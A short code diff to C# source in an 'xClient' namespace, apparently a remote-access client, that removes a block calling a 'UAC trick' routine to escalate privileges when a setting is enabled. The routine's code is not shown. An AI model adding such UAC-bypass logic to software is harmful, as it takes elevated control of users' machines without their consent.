@@ -125,15 +125,6 @@ namespace xClient
             SystemCore.AccountType = SystemCore.GetAccountType();
             GeoLocationHelper.Initialize();
 
-            if (Settings.ENABLEUACESCALATION)
-            {
-                if (SystemCore.TryUacTrick())
-                    SystemCore.Disconnect = true;
-
-                if (SystemCore.Disconnect)
-                    return;
-            }
-
             if (!Settings.INSTALL || SystemCore.MyPath == SystemCore.InstallPath)
             {
                 if (!SystemCore.CreateMutex(ref _appMutex))
